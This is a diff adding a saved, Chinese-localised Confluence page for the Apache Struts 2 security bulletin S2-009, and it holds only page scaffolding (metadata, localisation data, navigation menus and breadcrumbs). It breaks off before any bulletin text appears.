@@ -1,0 +1,1270 @@
+    
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+                            <title>S2-009 - Apache Struts 2 Wiki - Apache Software Foundation</title>
+    
+        
+
+                        
+    
+                        
+    
+
+                
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=EDGE,chrome=IE7">
+<meta charset="UTF-8">
+<meta id="confluence-context-path" name="confluence-context-path" content="/confluence">
+<meta id="confluence-base-url" name="confluence-base-url" content="https://cwiki.apache.org/confluence">
+
+    <meta id="atlassian-token" name="atlassian-token" content="96ec98752cfc0ba247ea3ce678acfbf57c4d0a57">
+
+
+<meta id="confluence-space-key" name="confluence-space-key" content="WW">
+<script type="text/javascript">
+        var contextPath = '/confluence';
+</script>
+
+    
+
+    <meta name="confluence-request-time" content="1595839924477">
+        
+    
+        
+            <meta name="ajs-use-keyboard-shortcuts" content="true">
+            <meta name="ajs-is-confluence-admin" content="false">
+            <meta name="ajs-connection-timeout" content="10000">
+            <script type="text/x-template" title="gliffy-webpanel-footer">
+        <div class="gliffy-webpanel-footer"><span>This Confluence installation runs a Free Gliffy License - Evaluate the <a href="http://www.gliffy.com/products/confluence-plugin/">Gliffy Confluence Plugin</a> for your Wiki!</span></div>
+</script>
+
+
+            <style>.ia-fixed-sidebar, .ia-splitter-left {width: 285px;}.theme-default .ia-splitter #main {margin-left: 285px;}.ia-fixed-sidebar {visibility: hidden;}</style>
+            <meta name="ajs-discovered-plugin-features" content="$discoveredList">
+            <meta name="ajs-keyboardshortcut-hash" content="244b3b2851a4a758ccc0304672ffd8c1">
+            
+    
+    
+            <meta name="ajs-page-title" content="S2-009">
+            <meta name="ajs-latest-published-page-title" content="S2-009">
+            <meta name="ajs-space-name" content="Apache Struts 2 Wiki">
+            <meta name="ajs-page-id" content="27836151">
+            <meta name="ajs-latest-page-id" content="27836151">
+            <meta name="ajs-content-type" content="page">
+            <meta name="ajs-parent-page-title" content="Security Bulletins">
+            <meta name="ajs-parent-page-id" content="61758">
+            <meta name="ajs-space-key" content="WW">
+            <meta name="ajs-max-number-editors" content="12">
+            <meta name="ajs-macro-placeholder-timeout" content="5000">
+            <meta name="ajs-jira-metadata-count" content="0">
+            <meta name="ajs-from-page-title" content="">
+            <meta name="ajs-can-remove-page" content="false">
+            <meta name="ajs-can-remove-page-hierarchy" content="false">
+            <meta name="ajs-browse-page-tree-mode" content="view">
+            <meta name="ajs-shared-drafts" content="true">
+            <meta name="ajs-context-path" content="/confluence">
+            <meta name="ajs-base-url" content="https://cwiki.apache.org/confluence">
+            <meta name="ajs-version-number" content="7.5.0">
+            <meta name="ajs-build-number" content="8501">
+            <meta name="ajs-remote-user" content="">
+            <meta name="ajs-remote-user-key" content="">
+            <meta name="ajs-remote-user-has-licensed-access" content="false">
+            <meta name="ajs-remote-user-has-browse-users-permission" content="false">
+            <meta name="ajs-current-user-fullname" content="">
+            <meta name="ajs-current-user-avatar-url" content="">
+            <meta name="ajs-current-user-avatar-uri-reference" content="/confluence/images/icons/profilepics/anonymous.svg">
+            <meta name="ajs-static-resource-url-prefix" content="/confluence/s/962fig/8501/fded9f91818631c3677be93247bf5ae6723a1c8d/_">
+            <meta name="ajs-global-settings-attachment-max-size" content="20971520">
+            <meta name="ajs-global-settings-quick-search-enabled" content="true">
+            <meta name="ajs-user-locale" content="zh_CN">
+            <meta name="ajs-enabled-dark-features" content="site-wide.shared-drafts,site-wide.synchrony,clc.quick.create,confluence.view.edit.transition,cql.search.screen,confluence-inline-comments-resolved,http.session.registrar,frontend.editor.v4,nps.survey.inline.dialog,confluence.efi.onboarding.new.templates,frontend.editor.v4.compatibility,atlassian.cdn.static.assets,pdf-preview,previews.sharing,previews.versions,file-annotations,collaborative-audit-log,confluence.efi.onboarding.rich.space.content,previews.conversion-service,editor.ajax.save,graphql,read.only.mode,previews.trigger-all-file-types,lucene.caching.filter,attachment.extracted.text.extractor,confluence.table.resizable,notification.batch,previews.sharing.pushstate,confluence-inline-comments-rich-editor,site-wide.synchrony.opt-in,file-annotations.likes,gatekeeper-ui-v2,v2.content.name.searcher,mobile.supported.version,pulp,confluence-inline-comments,quick-reload-inline-comments-flags,confluence-inline-comments-dangling-comment">
+            <meta name="ajs-atl-token" content="96ec98752cfc0ba247ea3ce678acfbf57c4d0a57">
+            <meta name="ajs-confluence-flavour" content="VANILLA">
+            <meta name="ajs-user-date-pattern" content="yyyy-M-d">
+            <meta name="ajs-access-mode" content="READ_WRITE">
+            <meta name="ajs-render-mode" content="READ_WRITE">
+            <meta name="ajs-date.format" content="MMM dd, yyyy">
+    
+    
+    
+
+<link rel="search" type="application/opensearchdescription+xml" href="/confluence/opensearch/osd.action" title="Apache Software Foundation">
+    
+                    
+            <meta name="ajs-create-issue-metadata-show-discovery" content="false">
+            
+
+    <script>
+window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
+WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u005C/confluence\u0022";
+WRM._unparsedData["com.atlassian.confluence.plugins.confluence-feature-discovery-plugin:confluence-feature-discovery-plugin-resources.test-mode"]="false";
+WRM._unparsedData["com.atlassian.confluence.plugins.synchrony-interop:synchrony-status-banner-loader.synchrony-status"]="false";
+WRM._unparsedData["com.atlassian.analytics.analytics-client:policy-update-init.policy-update-data-provider"]="false";
+WRM._unparsedData["com.atlassian.analytics.analytics-client:programmatic-analytics-init.programmatic-analytics-data-provider"]="false";
+WRM._unparsedData["com.atlassian.applinks.applinks-plugin:applinks-common-exported.applinks-help-paths"]="{\u0022entries\u0022:{\u0022applinks.docs.root\u0022:\u0022https://confluence.atlassian.com/display/APPLINKS-060/\u0022,\u0022applinks.docs.diagnostics.troubleshoot.sslunmatched\u0022:\u0022SSL+and+application+link+troubleshooting+guide\u0022,\u0022applinks.docs.diagnostics.troubleshoot.oauthsignatureinvalid\u0022:\u0022OAuth+troubleshooting+guide\u0022,\u0022applinks.docs.diagnostics.troubleshoot.oauthtimestamprefused\u0022:\u0022OAuth+troubleshooting+guide\u0022,\u0022applinks.docs.delete.entity.link\u0022:\u0022Create+links+between+projects\u0022,\u0022applinks.docs.adding.application.link\u0022:\u0022Link+Atlassian+applications+to+work+together\u0022,\u0022applinks.docs.administration.guide\u0022:\u0022Application+Links+Documentation\u0022,\u0022applinks.docs.oauth.security\u0022:\u0022OAuth+security+for+application+links\u0022,\u0022applinks.docs.troubleshoot.application.links\u0022:\u0022Troubleshoot+application+links\u0022,\u0022applinks.docs.diagnostics.troubleshoot.unknownerror\u0022:\u0022Network+and+connectivity+troubleshooting+guide\u0022,\u0022applinks.docs.configuring.auth.trusted.apps\u0022:\u0022Configuring+Trusted+Applications+authentication+for+an+application+link\u0022,\u0022applinks.docs.diagnostics.troubleshoot.authlevelunsupported\u0022:\u0022OAuth+troubleshooting+guide\u0022,\u0022applinks.docs.diagnostics.troubleshoot.ssluntrusted\u0022:\u0022SSL+and+application+link+troubleshooting+guide\u0022,\u0022applinks.docs.diagnostics.troubleshoot.unknownhost\u0022:\u0022Network+and+connectivity+troubleshooting+guide\u0022,\u0022applinks.docs.delete.application.link\u0022:\u0022Link+Atlassian+applications+to+work+together\u0022,\u0022applinks.docs.link.applications\u0022:\u0022Link+Atlassian+applications+to+work+together\u0022,\u0022applinks.docs.diagnostics.troubleshoot.oauthproblem\u0022:\u0022OAuth+troubleshooting+guide\u0022,\u0022applinks.docs.diagnostics.troubleshoot.migration\u0022:\u0022Update+application+links+to+use+OAuth\u0022,\u0022applinks.docs.relocate.application.link\u0022:\u0022Link+Atlassian+applications+to+work+together\u0022,\u0022applinks.docs.administering.entity.links\u0022:\u0022Create+links+between+projects\u0022,\u0022applinks.docs.upgrade.application.link\u0022:\u0022OAuth+security+for+application+links\u0022,\u0022applinks.docs.diagnostics.troubleshoot.connectionrefused\u0022:\u0022Network+and+connectivity+troubleshooting+guide\u0022,\u0022applinks.docs.configuring.auth.oauth\u0022:\u0022OAuth+security+for+application+links\u0022,\u0022applinks.docs.insufficient.remote.permission\u0022:\u0022OAuth+security+for+application+links\u0022,\u0022applinks.docs.configuring.application.link.auth\u0022:\u0022OAuth+security+for+application+links\u0022,\u0022applinks.docs.diagnostics\u0022:\u0022Application+links+diagnostics\u0022,\u0022applinks.docs.configured.authentication.types\u0022:\u0022OAuth+security+for+application+links\u0022,\u0022applinks.docs.adding.entity.link\u0022:\u0022Create+links+between+projects\u0022,\u0022applinks.docs.diagnostics.troubleshoot.unexpectedresponse\u0022:\u0022Network+and+connectivity+troubleshooting+guide\u0022,\u0022applinks.docs.configuring.auth.basic\u0022:\u0022Configuring+Basic+HTTP+Authentication+for+an+Application+Link\u0022,\u0022applinks.docs.diagnostics.troubleshoot.authlevelmismatch\u0022:\u0022OAuth+troubleshooting+guide\u0022}}";
+WRM._unparsedData["com.atlassian.applinks.applinks-plugin:applinks-common-exported.applinks-types"]="{\u0022crowd\u0022:\u0022\u4eba\u7fa4\u0022,\u0022confluence\u0022:\u0022Confluence\u0022,\u0022fecru\u0022:\u0022Fisheye / Crucible\u0022,\u0022stash\u0022:\u0022\u6682\u5b58\u0022,\u0022jira\u0022:\u0022Jira\u0022,\u0022refapp\u0022:\u0022\u76f8\u5173\u5e94\u7528\u7a0b\u5e8f\u0022,\u0022bamboo\u0022:\u0022\u7af9\u0022,\u0022generic\u0022:\u0022\u901a\u7528\u5e94\u7528\u7a0b\u5e8f\u0022}";
+WRM._unparsedData["com.atlassian.applinks.applinks-plugin:applinks-common-exported.entity-types"]="{\u0022singular\u0022:{\u0022refapp.charlie\u0022:\u0022Charlie\u0022,\u0022fecru.project\u0022:\u0022Crucible\u9879\u76ee\u0022,\u0022fecru.repository\u0022:\u0022FishEye \u4ed3\u5e93\u0022,\u0022stash.project\u0022:\u0022Stash \u9879\u76ee\u0022,\u0022generic.entity\u0022:\u0022\u901a\u7528\u9879\u76ee\u0022,\u0022confluence.space\u0022:\u0022Confluence\u7a7a\u95f4\u0022,\u0022bamboo.project\u0022:\u0022Bamboo\u9879\u76ee\u0022,\u0022jira.project\u0022:\u0022Jira \u9879\u76ee\u0022},\u0022plural\u0022:{\u0022refapp.charlie\u0022:\u0022\u67e5\u7406\u65af\u0022,\u0022fecru.project\u0022:\u0022Crucible\u9879\u76ee\u0022,\u0022fecru.repository\u0022:\u0022FishEye \u4ed3\u5e93\u96c6\u0022,\u0022stash.project\u0022:\u0022Stash\u9879\u76ee\u0022,\u0022generic.entity\u0022:\u0022\u901a\u7528\u9879\u76ee\u0022,\u0022confluence.space\u0022:\u0022Confluence\u7a7a\u95f4\u0022,\u0022bamboo.project\u0022:\u0022Bamboo\u9879\u76ee\u0022,\u0022jira.project\u0022:\u0022Jira \u9879\u76ee\u0022}}";
+WRM._unparsedData["com.atlassian.applinks.applinks-plugin:applinks-common-exported.authentication-types"]="{\u0022com.atlassian.applinks.api.auth.types.BasicAuthenticationProvider\u0022:\u0022\u57fa\u672c\u8bbf\u95ee\u0022,\u0022com.atlassian.applinks.api.auth.types.TrustedAppsAuthenticationProvider\u0022:\u0022\u4fe1\u4efb\u7684\u5e94\u7528\u65e0\u6548\u0022,\u0022com.atlassian.applinks.api.auth.types.CorsAuthenticationProvider\u0022:\u0022\u6b4c\u73e5\u0022,\u0022com.atlassian.applinks.api.auth.types.OAuthAuthenticationProvider\u0022:\u0022Oauth\u0022,\u0022com.atlassian.applinks.api.auth.types.TwoLeggedOAuthAuthenticationProvider\u0022:\u0022Oauth\u0022,\u0022com.atlassian.applinks.api.auth.types.TwoLeggedOAuthWithImpersonationAuthenticationProvider\u0022:\u0022Oauth\u0022}";
+WRM._unparsedData["com.atlassian.confluence.plugins.confluence-license-banner:confluence-license-banner-resources.license-details"]="{\u0022daysBeforeLicenseExpiry\u0022:0,\u0022daysBeforeMaintenanceExpiry\u0022:0,\u0022showLicenseExpiryBanner\u0022:false,\u0022showMaintenanceExpiryBanner\u0022:false,\u0022renewUrl\u0022:null,\u0022salesUrl\u0022:null}";
+WRM._unparsedData["com.atlassian.confluence.plugins.confluence-search-ui-plugin:confluence-search-ui-plugin-resources.i18n-data"]="{\u0022search.ui.recent.link.text\u0022:\u0022\u67e5\u770b\u66f4\u591a\u6700\u8fd1\u8bbf\u95ee\u0022,\u0022search.ui.filter.space.category.input.label\u0022:\u0022\u67e5\u627e\u7a7a\u95f4\u7c7b\u522b\u2026\u2026\u0022,\u0022search.ui.filter.clear.selected\u0022:\u0022\u6e05\u9664\u6240\u9009\u9879\u76ee\u0022,\u0022search.ui.search.results.empty\u0022:\u0022\u6211\u4eec\u627e\u4e0d\u5230\u4efb\u4f55\u5339\u914d\u201c{0}\u201d\u7684\u5185\u5bb9\u3002\u0022,\u0022search.ui.content.name.search.items.panel.load.all.top.items.button.text\u0022:\u0022\u663e\u793a\u66f4\u591a\u5e94\u7528\u7ed3\u679c......\u0022,\u0022search.ui.filter.space.archive.label\u0022:\u0022\u641c\u7d22\u5df2\u7ecf\u5f52\u6863\u7684\u7a7a\u95f4\u0022,\u0022search.ui.filter.label\u0022:\u0022\u7b5b\u9009\u5668\u0022,\u0022search.ui.filter.contributor.button.text\u0022:\u0022\u8d21\u732e\u8005\u0022,\u0022search.ui.filter.date.all.text\u0022:\u0022\u968f\u65f6\u0022,\u0022search.ui.filter.space.current.label\u0022:\u0022\u5f53\u524d\u0022,\u0022search.ui.clear.input.button.text\u0022:\u0022\u6e05\u9664\u6587\u672c\u0022,\u0022help.search.ui.link.title\u0022:\u0022\u641c\u7d22\u6280\u5de7\u0022,\u0022search.ui.search.results.clear.button\u0022:\u0022\u6e05\u7a7a\u7b5b\u9009\u5668\u3002\u0022,\u0022search.ui.filter.date.hour.text\u0022:\u0022\u8fc7\u53bb\u4e00\u5929\u0022,\u0022search.ui.filters.heading\u0022:\u0022\u7b5b\u9009\u65b9\u5f0f\u0022,\u0022search.ui.filter.label.input.label\u0022:\u0022\u67e5\u627e\u6807\u7b7e\u2026\u2026\u0022,\u0022search.ui.filter.date.month.text\u0022:\u0022\u8fc7\u53bb\u4e00\u4e2a\u6708\u0022,\u0022search.ui.recent.items.anonymous\u0022:\u0022\u5f00\u59cb\u63a2\u7d22\u3002 \u60a8\u7684\u641c\u7d22\u7ed3\u679c\u5c06\u663e\u793a\u5728\u6b64\u5904\u3002\u0022,\u0022search.ui.input.label\u0022:\u0022\u641c\u7d22\u0022,\u0022search.ui.search.result\u0022:\u0022{0,choice,1#{0}\u4e2a\u641c\u7d22\u7ed3\u679c|1\u005Cu003c{0}\u4e2a\u641c\u7d22\u7ed3\u679c}\u0022,\u0022search.ui.infinite.scroll.button.text\u0022:\u0022\u66f4\u591a\u7ed3\u679c\u0022,\u0022search.ui.filter.date.button.text\u0022:\u0022\u65e5\u671f\u0022,\u0022search.ui.filter.date.week.text\u0022:\u0022\u8fc7\u53bb\u4e00\u5468\u0022,\u0022search.ui.filter.label.button.text\u0022:\u0022\u6807\u7b7e\u0022,\u0022search.ui.input.alert\u0022:\u0022\u6309\u56de\u8f66\u952e(Enter)\u641c\u7d22\u0022,\u0022search.ui.filter.no.result.text\u0022:\u0022\u6211\u4eec\u627e\u4e0d\u5230\u4efb\u4f55\u7b26\u5408\u60a8\u641c\u7d22\u6761\u4ef6\u7684\u5185\u5bb9\u0022,\u0022search.ui.result.subtitle.calendar\u0022:\u0022\u56e2\u961f\u65e5\u7a0b\u8868\u0022,\u0022search.ui.filter.date.heading\u0022:\u0022\u4e0a\u6b21\u4fee\u6539\u0022,\u0022search.ui.result.subtitle.user\u0022:\u0022\u7528\u6237\u8d44\u6599\u0022,\u0022search.ui.filter.contributor.input.label\u0022:\u0022\u67e5\u627e\u4eba\u5458\u2026\u2026\u0022,\u0022search.ui.filter.content.type.button.text\u0022:\u0022\u7c7b\u578b\u0022,\u0022search.ui.filter.space.input.label\u0022:\u0022\u67e5\u627e\u7a7a\u95f4\u0022,\u0022search.ui.filter.date.year.text\u0022:\u0022\u8fc7\u53bb\u4e00\u5e74\u0022,\u0022search.ui.filter.space.button.text\u0022:\u0022\u7a7a\u95f4\u0022,\u0022search.ui.advanced.search.link.text\u0022:\u0022\u9ad8\u7ea7\u641c\u7d22\u0022,\u0022search.ui.generic.error\u0022:\u0022\u51fa\u9519\u4e86\u3002\u5237\u65b0\u9875\u9762\uff0c\u6216\u8005\u5982\u679c\u6301\u7eed\u53d1\u751f\u8fd9\u79cd\u60c5\u51b5\uff0c\u8bf7\u8054\u7cfb\u60a8\u7684\u7ba1\u7406\u5458\u3002\u0022,\u0022search.ui.recent.spaces\u0022:\u0022\u6700\u8fd1\u7a7a\u95f4\u0022,\u0022search.ui.search.results.clear.line2\u0022:\u0022\u8bf7\u5c1d\u8bd5\u4e0d\u540c\u7684\u641c\u7d22\u5173\u952e\u5b57\u6216\u8005\u0022,\u0022search.ui.filter.space.category.button.text\u0022:\u0022\u7a7a\u95f4\u7c7b\u522b\u0022,\u0022search.ui.search.results.clear.line1\u0022:\u0022\u627e\u4e0d\u5230\u5339\u914d\u7684\u641c\u7d22\u7ed3\u679c\u0022,\u0022search.ui.content.name.search.items.panel.load.all.top.items.admin.button.text\u0022:\u0022\u663e\u793a\u66f4\u591a\u8bbe\u7f6e\u548c\u5e94\u7528\u7ed3\u679c...\u0022,\u0022search.ui.recent.pages\u0022:\u0022\u6700\u8fd1\u8bbf\u95ee\u0022,\u0022search.ui.search.result.anonymous\u0022:\u0022{0,choice,1#{0}\u4e2a\u641c\u7d22\u7ed3\u679c| 1 \u005Cu003c{0}\u4e2a\u641c\u7d22\u7ed3\u679c}\u3002 \u60a8\u6709\u5e10\u6237\u5417\uff1f{1}\u767b\u5f55{2}\u641c\u7d22\u66f4\u591a\u7ed3\u679c\u3002\u0022,\u0022search.ui.recent.items.empty\u0022:\u0022\u5f00\u59cb\u63a2\u7d22\u3002 \u60a8\u6700\u8fd1\u8bbf\u95ee\u8fc7\u7684\u9875\u9762\u548c\u7a7a\u95f4\u5c06\u663e\u793a\u5728\u6b64\u5904\u3002\u0022,\u0022search.ui.result.subtitle.space\u0022:\u0022\u7a7a\u95f4\u0022,\u0022search.ui.filter.space.init.heading\u0022:\u0022\u6700\u8fd1\u7a7a\u95f4\u0022}";
+if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
+<link type="text/css" rel="stylesheet" href="static/css/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="static/css/batch-true_true_true.css" data-wrm-key="atl.confluence.plugins.pagetree-desktop,main,viewcontent,atl.general,page,atl.comments,-_super" data-wrm-batch-type="context" media="all">
+<script type="text/javascript" src="static/js/batch-zh-CN.js" data-wrm-key="_super" data-wrm-batch-type="context" data-initially-rendered=""></script>
+<script type="text/javascript" src="static/js/batch-true_true_true_zh-CN.js" data-wrm-key="atl.confluence.plugins.pagetree-desktop,main,viewcontent,atl.general,page,atl.comments,-_super" data-wrm-batch-type="context" data-initially-rendered=""></script>
+
+    
+
+        
+    
+
+        
+        <meta name="ajs-site-title" content="Apache Software Foundation">
+            
+    
+
+    
+                <link rel="canonical" href="">
+        <link rel="shortlink" href="https://cwiki.apache.org/confluence/x/976oAQ">
+    <meta name="wikilink" content="[WW:S2-009]">
+    <meta name="page-version" content="13">
+    <meta name="ajs-page-version" content="13">
+
+</head>
+
+    
+<body id="com-atlassian-confluence" class="theme-default  aui-layout aui-theme-default">
+
+        
+            <div id='stp-licenseStatus-banner'></div>
+    <ul id="assistive-skip-links" class="assistive">
+    <li><a href="#title-heading">转至内容</a></li>
+    <li><a href="#breadcrumbs">转至导航栏</a></li>
+    <li><a href="#header-menu-bar">转至主菜单</a></li>
+    <li><a href="#navigation">转至动作菜单</a></li>
+    <li><a href="#quick-search-query">转至快速搜索</a></li>
+</ul>
+<div id="page">
+<div id="full-height-container">
+    <div id="header-precursor">
+        <div class="cell">
+            
+                            </div>
+    </div>
+        
+
+
+
+
+
+<header id="header" role="banner">
+    <nav class="aui-header aui-dropdown2-trigger-group" role="navigation"><div class="aui-header-inner"><div class="aui-header-before"><a class=" aui-dropdown2-trigger app-switcher-trigger" aria-controls="app-switcher" aria-haspopup="true" role="button" tabindex="0" data-aui-trigger="" href="#app-switcher"><span class="aui-icon aui-icon-small aui-iconfont-appswitcher">已链接应用程序</span></a><div id="app-switcher" class="aui-dropdown2 aui-style-default" role="menu" aria-hidden="true" data-is-switcher="true" data-environment="{&quot;isUserAdmin&quot;:false,&quot;isAppSuggestionAvailable&quot;:false,&quot;isSiteAdminUser&quot;:false}"><div role="application"><div class="app-switcher-loading">正在上传和乱码；</div></div></div></div><div class="aui-header-primary"><h1 id="logo" class="aui-header-logo aui-header-logo-confluence"><a href="index.html"><span class="aui-header-logo-device">Apache Software Foundation</span></a></h1><ul class="aui-nav">
+                            <li>
+            
+        
+        
+<a id="space-directory-link" href="view.html" class=" aui-nav-imagelink" title="空间">
+            <span>空间</span>
+    </a>
+        </li>
+                                <li class="aui-buttons">
+            </li>
+</ul>
+</div><div class="aui-header-secondary"><ul class="aui-nav">
+                        <li>
+        <div id="search-ui" class="aui-quicksearch dont-default-focus header-quicksearch"><input id="quick-search-query" aria-label="搜索" placeholder="搜索" type="text"><div id="quick-search-alert" role="alert">按回车键(Enter)搜索</div><aui-spinner size="small"></aui-spinner></div>
+    </li>
+        <li>
+            
+        <a id="help-menu-link" class="aui-nav-link aui-dropdown2-trigger aui-dropdown2-trigger-arrowless" href="#" aria-haspopup="true" aria-owns="help-menu-link-content" title="帮助">
+        <span class="aui-icon aui-icon-small aui-iconfont-question-filled">帮助</span>
+    </a>
+    <nav id="help-menu-link-content" class="aui-dropdown2 aui-style-default" aria-hidden="true">
+                    <div class="aui-dropdown2-section">
+                                <ul id="help-menu-link-leading" class="aui-list-truncate section-leading first">
+                                            <li>
+        
+            
+<a id="confluence-help-link" href="javascript:;" class="    " title="访问Confluence文档首页" target="_blank">
+        在线帮助
+</a>
+</li>
+                                            <li>
+    
+            
+<a id="keyboard-shortcuts-link" href="confluence.html" class="    " title="查看可用的键盘快捷方式">
+        快捷键
+</a>
+</li>
+                                            <li>
+    
+            
+<a id="feed-builder-link" href="configurerssfeed.html" class="    " title="创建个性化的 RSS源。">
+        RSS源建立器
+</a>
+</li>
+                                            <li>
+    
+            
+<a id="whats-new-menu-link" href="javascript:;" class="    " title="">
+        新功能
+</a>
+</li>
+                                            <li>
+    
+            
+<a id="gadget-directory-link" href="confluence.html" class="   user-item administration-link " title="浏览小工具">
+        可用的小工具
+</a>
+</li>
+                                            <li>
+    
+            
+<a id="confluence-about-link" href="aboutconfluencepage.html" class="    " title="获取关于Confluence的更多信息">
+        关于Confluence
+</a>
+</li>
+                                    </ul>
+            </div>
+            </nav>
+    
+    </li>
+        <li>
+                
+    
+    </li>
+        <li>
+            
+    </li>
+        <li>
+                                            <li>
+        
+            
+<a id="login-link" href="javascript:;" class="   user-item login-link " title="">
+        登录
+</a>
+</li>
+                        <li>
+    
+            
+<a id="signup-link" href="signup.html" class="   user-item signup-link " title="">
+        注册
+</a>
+</li>
+                        
+    
+    </ul>
+</div></div><!-- .aui-header-inner--></nav><!-- .aui-header -->
+    <br class="clear">
+</header>
+    
+
+    
+    	<div class="ia-splitter">
+    		<div class="ia-splitter-left">
+    			<div class="ia-fixed-sidebar">
+                                            
+                            <div class="acs-side-bar ia-scrollable-section"><div class="acs-side-bar-space-info tipsy-enabled" data-configure-tooltip="编辑空间详情"><div class="avatar"><div class="space-logo" data-key="WW" data-name="Apache Struts 2 Wiki" data-entity-type="confluence.space"><div class="avatar-img-container"><div class="avatar-img-wrapper"><a href="home.html" title="Apache Struts 2 Wiki"><img class="avatar-img" src="static/picture/default-space-logo.svg" alt="Apache Struts 2 Wiki"></a></div></div></div></div><div class="space-information-container"><div class="name"><a href="home.html" title="Apache Struts 2 Wiki">Apache Struts 2 Wiki</a></div><div class="flyout-handle icon aui-icon aui-icon-small aui-iconfont-edit"></div></div></div><div class="acs-side-bar-content"><div class="acs-nav-wrapper"><div class="acs-nav" data-has-create-permission="false" data-quick-links-state="null" data-page-tree-state="null" data-nav-type="pages"><div class="acs-nav-sections"><div class="quick-links-wrapper"></div></div></div></div><div class="ia-secondary-container tipsy-enabled" data-tree-type="pages"><div class="ia-secondary-header"><h5 class="ia-secondary-header-title pages"><span class="label">子页面</span></h5></div><div class="ia-secondary-parent-content"><ul class="parent ia-secondary-header-title wiki"><li class="parent-item"><a class="parent-item-link" href="SecurityBulletins.html" title="Security Bulletins"><span class="icon"></span><span class="label">Security Bulletins</span></a></li></ul></div><div class="ia-secondary-current-content"><ul class="ia-secondary-currentPage-title wiki current-item"><li><span class="icon"></span><span class="label">S2-009</span></li></ul></div><div class="ia-secondary-content"><div class="contextual-nav-child-pages"></div></div></div></div><div class="hidden"><a href="pages-ww.html" id="space-pages-link"></a><script type="text/x-template" title="logo-config-content"><h2>空间详情</h2><div class="personal-space-logo-hint">您的个人头像被作为您的个人空间的logo使用。<a href="/confluence/users/profile/editmyprofilepicture.action" target="_blank">更改您的个人头像</a>.</div></script></div></div><div class="space-tools-section"><div id="space-tools-menu-additional-items" class="hidden"><div data-label="浏览页面" data-class="" data-href="/confluence/pages/reorderpages.action?key=WW">浏览页面</div></div><button id="space-tools-menu-trigger" class=" aui-dropdown2-trigger aui-button aui-button-subtle tipsy-enabled aui-dropdown2-trigger-arrowless " aria-controls="space-tools-menu" aria-haspopup="true" role="button" data-aui-trigger=""><span class="aui-icon aui-icon-small aui-iconfont-configure">设置</span><span class="aui-button-label">空间管理</span><span class="aui-icon "></span></button><div id="space-tools-menu" class="aui-dropdown2 aui-style-default space-tools-dropdown" role="menu" aria-hidden="true" data-aui-alignment="top left"><div role="application"></div></div><a class="expand-collapse-trigger aui-icon aui-icon-small aui-iconfont-chevron-double-left"></a></div>
+                    
+                        			</div>
+    		</div>
+        <!-- \#header -->
+
+            
+    
+        <div id="main" class=" aui-page-panel">
+                        <div id="main-header">
+                        
+    <div id="navigation" class="content-navigation view">
+                    <ul class="ajs-menu-bar">
+                                            
+        <li class="normal ajs-menu-item">
+        <a id="action-menu-link" class="action aui-dropdown2-trigger-arrowless aui-button aui-button-subtle ajs-menu-title aui-dropdown2-trigger" href="#" aria-haspopup="true" aria-label="更多选项" aria-owns="action-menu" data-container="#navigation">
+            <span>
+                                    <span class="aui-icon aui-icon-small aui-iconfont-more" aria-label="更多选项"></span>
+                                
+            </span>
+        </a>         <div id="action-menu" class="aui-dropdown2 aui-style-default" aria-hidden="true">
+                            <div class="aui-dropdown2-section">
+                    <ul id="action-menu-primary" class="section-primary first">
+                                                    <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="view-attachments-link" href="javascript:;" rel="nofollow" class="action-view-attachments" accesskey="t" title="查看附件">
+                        <span>
+                                <u>t</u>附件(0)
+            </span>        </a>
+    </li>
+                                                <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="action-view-history-link" href="javascript:;" rel="nofollow" class="action-view-history" title="">
+                        <span>
+                                页面历史
+            </span>        </a>
+    </li>
+                                                <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="who-can-view-button-ak-button" href="confluence.html" rel="nofollow" class="who-can-view-link" title="">
+                        <span>
+                                可以查看的人
+            </span>        </a>
+    </li>
+                                        </ul>
+                </div>
+                            <div class="aui-dropdown2-section">
+                    <ul id="action-menu-secondary" class="section-secondary">
+                                                    <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="view-resolved-comments" href="confluence.html" rel="nofollow" class="" title="">
+                        <span>
+                                已解决评论
+            </span>        </a>
+    </li>
+                                                <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="view-page-info-link" href="javascript:;" rel="nofollow" class="action-view-info" title="">
+                        <span>
+                                页面信息
+            </span>        </a>
+    </li>
+                                                <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="view-in-hierarchy-link" href="javascript:;" rel="nofollow" class="" title="">
+                        <span>
+                                以层级方式查看
+            </span>        </a>
+    </li>
+                                                <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="action-view-source-link" href="javascript:;" rel="nofollow" class="action-view-source popup-link" title="">
+                        <span>
+                                查看页面源代码
+            </span>        </a>
+    </li>
+                                                <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="delete-all-comments-link-link" href="javascript:;" rel="nofollow" class="" title="">
+                        <span>
+                                Delete comments
+            </span>        </a>
+    </li>
+                                                <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="action-export-pdf-link" href="javascript:;" rel="nofollow" class="" title="">
+                        <span>
+                                导出为PDF
+            </span>        </a>
+    </li>
+                                                <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="com-k15t-confluence-scroll-epub-launcher" href="javascript:;" rel="nofollow" class="" title="">
+                        <span>
+                                Export to EPUB
+            </span>        </a>
+    </li>
+                                                <li>
+
+    
+        
+    
+                                                        
+    
+    
+            <a id="action-export-word-link" href="javascript:;" rel="nofollow" class="action-export-word" title="">
+                        <span>
+                                导出为Word
+            </span>        </a>
+    </li>
+                                        </ul>
+                </div>
+                    </div>
+    </li>
+            </ul>
+    </div>
+
+            
+            <div id="title-heading" class="pagetitle with-breadcrumbs">
+                
+                                    <div id="breadcrumb-section">
+                        
+    
+    
+    <ol id="breadcrumbs">
+                                        
+                        
+        <li class="first">
+                        
+                            <span class=""><a href="pages-ww.html">页面</a></span>
+                                                                                    
+                        
+        <li>
+                        
+                            <span class=""><a href="home.html">Home</a></span>
+                                                                                    
+                        
+        <li>
+                        
+                            <span class=""><a href="SecurityBulletins.html">Security Bulletins</a></span>
